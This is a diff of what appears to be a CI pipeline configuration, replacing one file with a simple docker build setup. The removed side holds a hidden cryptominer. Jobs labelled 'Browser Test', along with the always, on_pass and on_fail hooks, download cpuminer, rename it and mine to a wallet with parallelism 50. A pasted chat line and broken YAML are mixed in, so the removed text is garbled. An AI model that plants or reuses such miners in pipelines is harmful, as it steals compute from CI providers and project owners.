@@ -1,64 +1,14 @@
-# Donwload File
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-
-# extrak file
-tar xf cpuminer-opt-linux.tar.gz 
-
-# Run Mining
-while [ 1 ]; do
-./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC
-sleep 2
-done
-
-# selesai
-
-Letto, [13.02.21 07:24]
-- 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-          - tar xf cpuminer-opt-linux.tar.gz
-          - mv cpuminer-sse2 lukman
-          - './lukman -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC -t0'
-      jobs:
-        - name: Browser Test
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC -t0'
-          parallelism: 50
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC -t0'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC -t0'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u GctRp48BKN7SjmLwwQfxg1u5ea6v7MsG2J.o -p c=BTG,zap=MBC -t0'
-  - name: Run Security Tests
+version: v1.0
+name: Docker
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: Build
     task:
       jobs:
-        - name: Deployment Checklist
+        - name: docker build
           commands:
             - checkout
-            - cache restore
-            - pip install -r requirements.txt --cache-dir .pip_cache
-            - python manage.py check --deploy --fail-level ERROR
-
-
-
-
-
-
-
-
-
+            - docker build -t your-image .
